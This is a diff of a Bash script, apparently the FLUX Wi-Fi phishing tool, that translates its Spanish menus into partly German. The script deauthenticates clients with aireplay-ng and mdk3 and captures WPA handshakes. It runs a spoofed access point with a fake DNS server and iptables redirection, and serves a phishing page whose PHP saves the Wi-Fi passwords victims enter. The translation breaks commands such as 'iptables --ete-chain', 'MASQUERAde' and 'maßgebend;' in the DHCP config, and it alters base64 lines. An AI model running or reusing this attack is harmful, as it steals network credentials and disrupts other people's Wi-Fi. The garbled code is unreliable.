-		echo -e "      "$gruen"1)"$transparent" Hostapd ("$rot"Recomendado"$transparent")"
-		echo -e "      "$gruen"2)"$transparent" airbase-ng "
-		echo -e "      "$gruen"3)"$transparent" Atras"
+		echo -e "      "$gruen"1)"$transparent" Hostapd ("$rot"Empfohlen"$transparent")"
+		echo -e "      "$gruen"2)"$transparent" airbase-ng"
+		echo -e "      "$gruen"3)"$transparent" zurück"
 		echo "                                       "
 		echo -n "      #> "
 		read yn
@@ -749,31 +843,53 @@ function askAP {
 			1 ) fakeapmode="hostapd"; authmode="handshake"; handshakelocation; break ;;
 			2 ) fakeapmode="airbase-ng"; askauth; break ;;
 			3 ) selection; break ;;
-			* ) echo "Opción descoNeincida. Elige de nuevo"; clear ;;
+			* ) echo "Unbekannte Option. Wählen sie wieder"; conditional_clear ;;
 		esac
 	done 
 	
 } 
 
-########################################################################################
-########################################################################################
+function askauth {
+	
+	conditional_clear
+	
+	mostrarheader
+	while true; do
+		
+		echo "Prüfungsmethode "
+		echo "                                       "
+		echo -e "      "$gruen"1)"$transparent" Handshake ("$rot"Recomendado"$transparent")"
+		echo -e "      "$gruen"2)"$transparent" wpa_supplicant [weniger Effectiv]"
+		echo -e "      "$gruen"3)"$transparent" zurück"
+		echo "                                       "
+		echo -n "      #> "
+		read yn
+		echo ""
+		case $yn in
+			1 ) authmode="handshake"; handshakelocation; break ;;
+			2 ) authmode="wpa_supplicant"; webinterface; break ;;
+			3 ) askAP; break ;;
+			* ) echo "Unbekannte Option. Wählen Sie wieder"; conditional_clear ;;
+		esac
+	done 
+	
+} 
 
 function handshakelocation {
 	
-	clear
-#Editieren Copyright by flux 
+	conditional_clear
+	
 	mostrarheader
 	infoap
 	echo
-	echo -e "Speichern vom Handshark(Ej: $rot/root/micaptura.cap$transparent)"
-	echo -e "Pulsar ${gelb}ENTER$transparent para omitir"
+	echo -e "Geben sie den Pfad ein, für handshake(Ej: $rot/root/micaptura.cap$transparent)"
+	echo -e "Drücke ${gelb}ENTER$transparent um zu überspringen"
 	echo
-	echo -n "ruta: "
+	echo -n "Router"
 	echo -ne "$rot"
 	read handshakeloc
 	echo -ne "$transparent"
 	
-#Editieren 
 		if [ "$handshakeloc" = "" ]; then
 			deauthforce
 		else
@@ -781,11 +897,11 @@ function handshakelocation {
 				Host_SSID_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
 				Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
 				if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
-					if pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "Gut,"; then
+					if pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
 						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
 						webinterface
 					else
-					echo "Schlechter Handshake"
+					echo "Schlechter handshake"
 					sleep 4
 					handshakelocation
 					fi
@@ -805,7 +921,7 @@ function handshakelocation {
 					handshakelocation
 				fi
 			else
-				echo -e "Archivo ${rot}Nein$transparent existe"
+				echo -e "Archivo ${rot}NO$transparent existe"
 				sleep 4
 				handshakelocation
 			fi
@@ -814,25 +930,25 @@ function handshakelocation {
 
 function deauthforce {
 	
-	clear
+	conditional_clear
 	
 	mostrarheader
 	while true; do
 		
-		echo "TIPO DE COMPROBACION DEL HANDSHAKE"
+		echo "Überprüfe HANDSHAKE"
 		echo "                                       "
-		echo -e "      "$gruen"1)"$transparent" Neinrmal"
-		echo -e "      "$gruen"2)"$transparent" Zurück"
-		echo -e "      "$gruen"3)"$transparent" Schließen"
+		echo -e "      "$gruen"1)"$transparent" Normal (Posibilidades de fallo)"
+		echo -e "      "$gruen"2)"$transparent" Genau"
+		echo -e "      "$gruen"3)"$transparent" zurück"
 		echo "                                       "
 		echo -n "      #> "
 		read yn
 		echo ""
 		case $yn in
-			1 ) handshakemode="Neinrmal"; askclientsel; break ;;
+			1 ) handshakemode="normal"; askclientsel; break ;;
 			2 ) handshakemode="hard"; askclientsel; break ;;
 			3 ) askauth; break ;;
-			* ) echo "Opción descoNeincida. Elige de nuevo"; clear ;;
+			* ) echo "Unbekannte Option. Wählen Sie wieder"; conditional_clear ;;
 		esac
 	done 
 }
@@ -846,21 +962,20 @@ function deauthforce {
 
 ############################################# < HANDSHAKE > ############################################
 
-#Handshake 
 
 function askclientsel {
 	
-	clear
+	conditional_clear
 	
 	while true; do
 		mostrarheader
 		
-		echo "Captcha Handshake vom Netzwerk"
+		echo "CAPTURAR HANDSHAKE  CLIENTE"
 		echo "                                       "
-		echo -e "      "$gruen"1)"$transparent" Realizar desaut. massva al AP objetivo"
-		echo -e "      "$gruen"2)"$transparent" Realizar desaut. massva al AP (mdk3)"
-		echo -e "      "$gruen"3)"$transparent" Realizar desaut. especifica al AP objetivo"
-		echo -e "      "$gruen"4)"$transparent" Volver a escanear las redes"
+		echo -e "      "$gruen"1)"$transparent" deauth all"
+		echo -e "      "$gruen"2)"$transparent" deauth all mdk3"
+		echo -e "      "$gruen"3)"$transparent" deauth ein bestimmtes Ziel"
+		echo -e "      "$gruen"4)"$transparent" rescann"
 		echo -e "      "$gruen"5)"$transparent" Beenden"
 		echo "                                       "
 		echo -n "      #> "
@@ -870,9 +985,9 @@ function askclientsel {
 			1 ) deauth all; break ;;
 			2 ) deauth mdk3; break ;;
 			3 ) deauth esp; break ;;
-			4 ) killall airodump-ng &>$flux_output_device; vk496; break;;    
+			4 ) killall airodump-ng &>$flux_output_device; deltax; break;;    
 			5 ) exitmode; break ;;
-			* ) echo "Opción descoNeincida. Elige de nuevo"; clear ;;
+			* ) echo "Unbekannte Option. Wählen Sie wieder"; conditional_clear ;;
 		esac
 	done 
 	
@@ -881,29 +996,29 @@ function askclientsel {
 # 
 function deauth {
 	
-	clear
+	conditional_clear
 	
 	iwconfig $WIFI_MONITOR channel $Host_CHAN
 	
 	case $1 in
 		all )
-			DEAUTH=deauthall
-			capture & $DEAUTH
+			deAUTH=deauthall
+			capture & $deAUTH
 			CSVDB=$Host_MAC-01.csv
 		;;
 		mdk3 )
-			DEAUTH=deauthmdk3
-			capture & $DEAUTH &
+			deAUTH=deauthmdk3
+			capture & $deAUTH &
 			CSVDB=$Host_MAC-01.csv
 		;;
 		esp )
-			DEAUTH=deauthesp
+			deAUTH=deauthesp
 			HOST=`cat $DUMP_PATH/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
 			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`
 			
 			if [ $LINEAS_CLIENTES -le 5 ]; then
-				DEAUTH=deauthall
-				capture & $DEAUTH
+				deAUTH=deauthall
+				capture & $deAUTH
 				CSVDB=$Host_MAC-01.csv
 				deauth
 				
@@ -914,7 +1029,7 @@ function deauth {
 				Client_MAC=`echo ${CLIENT:0:17}`	
 				deauthesp
 			done
-			$DEAUTH
+			$deAUTH
 			CSVDB=$Host_MAC-01.csv
 		;;
 	esac
@@ -926,20 +1041,20 @@ function deauth {
 
 function deauthMENU {
 	
-	Handshake_statuscheck="${grau}sin handshake$transparent"
+	Handshake_statuscheck="${grau }Sin handshake$transparent"
 	
 	while true; do
-		clear
+		conditional_clear
 		mostrarheader
 		
-		echo "Handshake ?"
+		echo "¿Handshake fangen?"
 		echo 
-		echo -e "Estado del handshake: $Handshake_statuscheck"
+		echo -e "Estado  handshake: $Handshake_statuscheck"
 		echo
 		echo -e "      "$gruen"1)"$transparent" Ja" 
-		echo -e "      "$gruen"2)"$transparent" Nein"
-		echo -e "      "$gruen"3)"$transparent" Nein"  
-		echo -e "      "$gruen"4)"$transparent" Nur rot makierten (Ausgewählten)"  
+		echo -e "      "$gruen"2)"$transparent" Nein "
+		echo -e "      "$gruen"3)"$transparent" Nein "  
+		echo -e "      "$gruen"4)"$transparent" Wählen sie ein anderes Netzwerk"  
 		echo -e "      "$gruen"5)"$transparent" Beenden"
 		echo " "
 		echo -n '      #> '
@@ -947,31 +1062,31 @@ function deauthMENU {
 		
 		case $yn in
 			1 ) checkhandshake;;
-			2 ) capture; $DEAUTH & ;;
-			3 ) clear; askclientsel; break;;
+			2 ) capture; $deAUTH & ;;
+			3 ) conditional_clear; askclientsel; break;;
 			4 ) killall airodump-ng &>$flux_output_device; CSVDB=dump-01.csv; breakmode=1; selection; break ;;
 			5 ) exitmode; break;;
-			* ) echo "Opción descoNeincida. Elige de nuevo"; clear ;;
+			* ) echo "Unbekannte Option. Wählen Sie wieder"; conditional_clear ;;
 		esac
 		
 	done
 }
 
-# Capruta todas las redes
+# Jedes Netzwerk erfassen
 function capture {
 	
-	clear
+	conditional_clear
 	if ! ps -A | grep -q airodump-ng; then
 		
 		rm -rf $DUMP_PATH/$Host_MAC*
-		xterm $HOLD -title "Capturando datos en el canal --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
+		xterm $HOLD -title "Kanal erfassen --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
 	fi
 }
 
-# Comprueba el handshake antes de continuar
+# Überprüfe handshake vor den fortfahren
 function checkhandshake {
 	
-	if [ "$handshakemode" = "Neinrmal" ]; then
+	if [ "$handshakemode" = "normal" ]; then
 		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
 			killall airodump-ng &>$flux_output_device
 			webinterface
@@ -1005,13 +1120,13 @@ function checkhandshake {
 
 
 
-############################################# < ATAQUE > ############################################
+############################################# < START > ############################################
 
-# Selecciona interfaz web que se va a usar
+# Wähle Netzwerkschnittstellen, die verwendet werden 
 function webinterface {
 	
 	while true; do
-		clear
+		conditional_clear
 		mostrarheader
 		
 		infoap
@@ -1019,8 +1134,8 @@ function webinterface {
 		echo "SELECCIONA LA INTERFACE WEB"
 		echo
 		
-		echo -e "$gruen""1)"$transparent" Interface web neutra"
-		echo -e "$gruen""2)"$transparent" \e[1;31mBeenden"$transparent""
+		echo -e "$gruen""1)"$transparent" Web Interface"
+		echo -e "$gruen""2)"$transparent" \e[1;31mSalir"$transparent""
 		
 		echo
 		echo -n "#? "
@@ -1029,7 +1144,7 @@ function webinterface {
 		if [ "$line" = "2" ]; then
 			exitmode
 		elif [ "$line" = "1" ]; then
-			clear
+			conditional_clear
 			mostrarheader
 			
 			infoap
@@ -1042,6 +1157,7 @@ function webinterface {
 			echo -e "$gruen""3)"$transparent" Italy       [IT]"
 			echo -e "$gruen""4)"$transparent" French      [FR]"
 			echo -e "$gruen""5)"$transparent" Portuguese  [POR]"
+			echo -e "$gruen""5)"$transparent" Deutsch     [DE]"
 			echo -e "$gruen""6)"$transparent" \e[1;31mAtras"$transparent""
 			
 			echo
@@ -1104,7 +1220,18 @@ function webinterface {
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_POR
 				NEUTRA
 				break
+
 			elif [ "$linea" = "6" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_DE
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_DE
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_DE
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_DE_SUBMIT_ENG
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_EN
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ENG
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ENG
+				NEUTRA
+				break
+			elif [ "$linea" = "7" ]; then
 				continue
 			fi
 		fi
@@ -1114,17 +1241,17 @@ function webinterface {
 	attack
 }
 
-# Crea distintas configuraciones necesarias para el script y preapa los servicios
+# Erstellt viele verschidene Konfigurationsdatein 
 function preattack {
 	
-# Genera el config de hostapd
+# Erzeugt config [HOSTAPD]
 echo "interface=$WIFI
 driver=nl80211
 ssid=$Host_SSID
 channel=$Host_CHAN
 ">$DUMP_PATH/hostapd.conf
 
-# Crea el php que usan las ifaces
+#php
 echo "<?php
 error_reporting(0);
 
@@ -1145,7 +1272,7 @@ fclose(\$fp);
 \$intento = \"$DUMP_PATH/intento\";
 
 
-// Marge all the variables with text in a Jangle variable. 
+// Marge all the variables with text in a single variable. 
 \$f_data= ''.\$key1.'';
 
 
@@ -1188,8 +1315,8 @@ sleep(1);
 
 ?>" > $DUMP_PATH/data/savekey.php
 
-# Se crea el config del servidor DHCP
-echo "authoritative;
+# Erzeugt Serverkonfiguration DHCP
+echo "maßgebend;
 
 default-lease-time 600;
 max-lease-time 7200;
@@ -1206,7 +1333,7 @@ range $RANG_IP.100 $RANG_IP.250;
 } 
 " >$DUMP_PATH/dhcpd.conf
 
-# Se crea el config del servidor web Lighttpd
+# Webserver für Lighttpd wird erzeugt
 echo "server.document-root = \"$DUMP_PATH/data/\"
 
 server.modules = (
@@ -1244,7 +1371,7 @@ static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\"
 index-file.names = ( \"index.htm\" )
 " >$DUMP_PATH/lighttpd.conf
 
-# Script (Nein es mio) que redirige todas las peticiones del DNS a la puerta de enlace (nuestro PC)
+# DNS das alle Anfragen zum Angreifer weiterleitet
 echo "import socket
 
 class DNSQuery:
@@ -1265,9 +1392,9 @@ class DNSQuery:
     packet=''
     if self.dominio:
       packet+=self.data[:2] + \"\x81\x80\"
-      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Numero preg y respuestas
-      packet+=self.data[12:]                                         # Neinmbre de dominio original
-      packet+='\xc0\x0c'                                             # Puntero al Neinmbre de dominio
+      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Anzahl preg y respuestas
+      packet+=self.data[12:]                                         # Nombre de dominio original
+      packet+='\xc0\x0c'                                             # Puntero al nombre de dominio
       packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Tipo respuesta, ttl, etc
       packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # La ip en hex
     return packet
@@ -1293,7 +1420,7 @@ chmod +x $DUMP_PATH/fakedns
 	
 }
 
-# Prepara las tablas de enrutamiento para establecer un servidor DHCP/WEB
+# DHCP / WEB
 function routear {
 	
 	ifconfig $interfaceroutear up
@@ -1304,15 +1431,15 @@ function routear {
 	
 	iptables --flush
 	iptables --table nat --flush
-	iptables --delete-chain
-	iptables --table nat --delete-chain
+	iptables --ete-chain
+	iptables --table nat --ete-chain
 	iptables -P FORWARD ACCEPT
 	
 	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
-	iptables -t nat -A POSTROUTING -j MASQUERADE
+	iptables -t nat -A POSTROUTING -j MASQUERAde
 }
 
-# Ejecuta el ataque
+# Angriff
 function attack {
 	
 	if [ "$fakeapmode" = "hostapd" ]; then
@@ -1322,13 +1449,13 @@ function attack {
 	fi
 	
 	handshakecheck
-	Neinmac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)
+	nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)
 	
 	if [ "$fakeapmode" = "hostapd" ]; then
 		
 		ifconfig $WIFI down
 		sleep 0.4
-		macchanger --mac=${mac::13}$Neinmac${mac:14:4} $WIFI &> $flux_output_device
+		macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $flux_output_device
 		sleep 0.4
 		ifconfig $WIFI up
 		sleep 0.4
@@ -1340,7 +1467,7 @@ function attack {
 		xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
 		elif [ $fakeapmode = "airbase-ng" ]; then
 		killall airbase-ng &> $flux_output_device
-		xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SJaD -c $Host_CHAN -a ${mac::13}$Neinmac${mac:14:4} $WIFI_MONITOR &
+		xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
 	fi
 	sleep 5
 	
@@ -1359,17 +1486,17 @@ function attack {
 	killall aireplay-ng &> $flux_output_device
 	killall mdk3 &> $flux_output_device
 	echo "$(cat $DUMP_PATH/dump-02.csv | cut -d "," -f1,14 | grep "$Host_SSID" | cut -d "," -f1)" >$DUMP_PATH/mdk3.txt
-	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautentificando con mdk3 a todos de $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "desautentificando con mdk3 a todos de $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 	
-	xterm -hold $TOPRIGHT -title "Esperando la pass" -e $DUMP_PATH/handcheck &
-	clear
+	xterm -hold $TOPRIGHT -title "Warte auf Passwort" -e $DUMP_PATH/handcheck &
+	conditional_clear
 	
 	while true; do
 		mostrarheader
 		
 		echo "Ataque en curso..."
 		echo "                                       "
-		echo "      1) Elegir otra red" 
+		echo "      1) Wählen sie ein anderes Netzwerk" 
 		echo "      2) Beenden"
 		echo " "
 		echo -n '      #> '
@@ -1377,13 +1504,13 @@ function attack {
 		case $yn in
 			1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
 			2 ) matartodo; exitmode; break;;
-			* ) echo "Opción descoNeincida. Elige de nuevo"; clear ;;
+			* ) echo "Unbekannte Option. Wählen Sie wieder"; conditional_clear ;;
 		esac
 	done
 	
 }
 
-# Comprueba la validez de la contraseña
+# Überprüft handshake
 function handshakecheck {
 	
 	echo "#!/bin/bash
@@ -1430,7 +1557,7 @@ function handshakecheck {
 	if [ $authmode = "handshake" ]; then
 		echo "if [ -f $DUMP_PATH/intento ]; then
 		
-		if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Passphrase Neint in\"; then
+		if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Passphrase not in\"; then
 		echo \"2\">$DUMP_PATH/intento
 		break
 		else
@@ -1441,7 +1568,7 @@ function handshakecheck {
 		
 	elif [ $authmode = "wpa_supplicant" ]; then
 		  echo "
-		wpa_passphrase $Host_SSIDD \$(cat $DUMP_PATH/data.txt)>$DUMP_PATH/wpa_supplicant.conf &
+		wpa_passphrase $Host_SSID \$(cat $DUMP_PATH/data.txt)>$DUMP_PATH/wpa_supplicant.conf &
 		wpa_supplicant -i$WIFI -c$DUMP_PATH/wpa_supplicant.conf -f $DUMP_PATH/loggg &
 		
 		if [ -f $DUMP_PATH/intento ]; then
@@ -1460,14 +1587,14 @@ function handshakecheck {
 	echo "readarray -t CLIENTESDHCP < <(cat $DUMP_PATH/clientes.txt | grep \"DHCPACK on\"| awk '!x[\$0]++' )
 	
 	echo
-	echo -e \"  PUNTO DE ACCESO:\"
-	echo -e \"    Neinmbre..........: "$weis"$Host_SSID"$transparent"\"
+	echo -e \"  PUNTO de ACCESO:\"
+	echo -e \"    Nombre..........: "$weis"$Host_SSID"$transparent"\"
 	echo -e \"    MAC.............: "$gelb"$Host_MAC"$transparent"\"
 	echo -e \"    Canal...........: "$weis"$Host_CHAN"$transparent"\"
-	echo -e \"    Fabricante......: "$gruen"$Host_MAC_MODEL"$transparent"\"
-	echo -e \"    Tiempo activo...: "$grau"\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
+	echo -e \"    Fabricante......: "$gruen"$Host_MAC_MO"$transparent"\"
+	echo -e \"    Tiempo activo...: "$grau "\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
 	echo -e \"    Intentos........: "$rot"\$(cat $DUMP_PATH/hit.txt)"$transparent"\"
-	echo -e \"    Clientes........: "$azul"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '!x[\$0]++' | wc -l)"$transparent"\"
+	echo -e \"    Clientes........: "$blau"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '!x[\$0]++' | wc -l)"$transparent"\"
 	echo
 	echo -e \"  CLIENTES:\"
 	
@@ -1509,10 +1636,10 @@ function handshakecheck {
 	killall wpa_passphrase &>$flux_output_device
 	
 	echo \"
-	flux $version by deltax
+	FLUX $version by deltax
 	
 	SSID: $Host_SSID
-	BSSID: $Host_MAC ($Host_MAC_MODEL)
+	BSSID: $Host_MAC ($Host_MAC_MO)
 	Channel: $Host_CHAN
 	Security: $Host_ENC
 	Time: \$ih\$horas:\$im\$minutos:\$is\$segundos
@@ -1533,29 +1660,33 @@ function handshakecheck {
 }
 
 
+############################################# < Angriff > ############################################
 
+
+
+# deauth all
 function deauthall {
 	
-	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deautentication  a todos de $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --igNeinre-negative-one $WIFI_MONITOR &
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "desautenticando a todos de $Host_SSID" -e aireplay-ng --deauth $deAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
 }
 
 function deauthmdk3 {
 	
 	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
-	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deautentication  mdk3 a todos de $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "desautenticando mdk3 a todos de $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 	mdk3PID=$!
 	sleep 15
 	kill $mdk3PID &>$flux_output_device
 }
 
-
+# deauth einen bestimmtes opfer
 function deauthesp {
 	
 	sleep 2
-	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deautentication  a $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --igNeinre-negative-one $WIFI_MONITOR &
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "desautenticando a $Client_MAC" -e aireplay-ng -0 $deAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
 }
 
-
+# Schließt alle Prozesse
 function matartodo {
 	
 	killall aireplay-ng &>$flux_output_device
@@ -1567,14 +1698,17 @@ function matartodo {
 	
 }
 
+
+
+######################################### < INTERFACES WEB > ########################################
+
+# Erstellt Inhalte für die WEB GUI
 function NEUTRA {
 	
 	if [ ! -d $DUMP_PATH/data ]; then
 		mkdir $DUMP_PATH/data
 	fi
-
-#Danke an flux vk439 
-
+	
 echo "UEsDBBQAAAAIAEZ8zkSJ9HAPjoIAAMRtAQATABwAanF1ZXJ5LTEuOC4zLm1pbi5qc1VUCQADVE+c
 U1RPnFN1eAsAAQQAAAAABAAAAACcfWl720aW7vf7K0RMRg2YRUrM0tMDCuZ4vXbfeOnYnaSHYvJA
 ZFGCDQEMFi0h+d/nvKcWFEDIyZ08joil1lOnzl4HJ48GR5/+Ucvi/uhmMv7b+JujT7/hbrzMr492
@@ -1604,22 +1738,22 @@ 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
-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
+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
-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
+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
-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
+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
-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
+sQi2eVTqFmsCPKn1pGwDaWv0kBsOk9MiocLxcTOUnJjbPHdUk3dZR+Tmde1AXqsQwL8cuyOmZcYu
 mKoyL9nKA70tch8QDWnaUDDLScoLrFXBnVwQz7M2BVlErclnCy270RCGw/ViCpgnA7WmgFitro+P
 cQGyS3uuZoglBMiYdgVfKrk4sLgcgwAUxpB05PE4Sxpn1GkFdKFpiO+Y8aJMRDRihqLFIozV1hic
 MmYpasLNEwTXo5E4pU1gkGGPxcq4NKZDtF3OveqqyG9LbxFUEUyHimrDHqzutf02NTR7W1bE7IjU
@@ -1648,11 +1782,11 @@ AS0eiUua8npMTMI+0b9R0lhCdzu+0ZsNhubAtTb8y5qNYAtyhN9/ZeAgVQ6VkjZGUjnlHDN6mw9E
 W22Ak3uIjNOKWPwk7Ji1SY7LImW+LubG9jzMoBE3lmO6lZbXw7hCjCheJtU9ibU8sUiSNOjYggvH
 TATmoqx6MGnJsEV7/nPWuPsSedsEYKga4WCyb5w7srEAlnDw5EslWEH/zOKb5DKu8oIkYTlWYUJs
 H/iK1ph5mwNB7ACSPrqPWXMlEt59TkORd+/WxE2U7uG8qvIPbJUhFnPw7iou391mWna8J9ajirq1
-i+Ra3DSMwfWTYdlJBMmc5Q7Auk7m56PhYubPwvPVo/PxLjhfDelmLl8s1Bu63wUn4zKvC5rNZXRy
+i+Ra3DSMwfWTYdlJBMmc5Q7Auk7m56PhYubPwvPVo/PxLjhfmLl8s1Bu63wUn4zKvC5rNZXRy
 /uFE3NNPOTwRF9HJL/Pz8rx++eLly/O7J6eL4a5z/9XJpbilYmj0l387Wzzyz+bnt+c/LYaPg/kv
 jxePvtr9m48no8Wj4KvgRLygwmf++e0wOC8fnZ/MHlPNs/OT88njXfDVifjAXS4ECdXnJdU+EXfR
 CRX5ZRfuRIB5UK15MKRuP9Ioz9Gvd35+fnKxzgqSbuv5+SoerZ+MXi623+4DKvY2OvHmv6BMcZ4t
-Hnk7RD3tONhpB6a8GynwfBFAl+IZDWx0XY5OxOfoZORzN78v6E0ivu9dE78ael7HZ7oXT1zGniCs
